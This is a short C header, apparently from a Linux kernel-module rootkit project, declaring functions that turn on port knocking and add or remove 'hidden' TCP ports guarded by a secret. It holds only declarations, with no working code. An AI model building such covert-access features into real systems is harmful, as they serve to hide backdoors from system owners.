#ifndef LKM_TLSKIT_PORT_KNOCKING_H
#define LKM_TLSKIT_PORT_KNOCKING_H

#include "shared.h"

/**
 * Enable port knocking
 * @return 0 on success, -1 else
 */
int enable_port_knocking(void);

/**
 * Disable port knocking
 */
void disable_port_knocking(void);

/**
 * Add a tcp port that should be protected by port knocking
 * @param data: contains port and specific secret
 * @return 0 on success, -1 else
 */
int port_knocking_add(struct hidden_port data);

/**
 * Remove a tcp port from port knocking
 * @param port
 * @return 0 on success, -1 else
 */
int port_knocking_rm(unsigned short port);


#endif //LKM_TLSKIT_PORT_KNOCKING_H
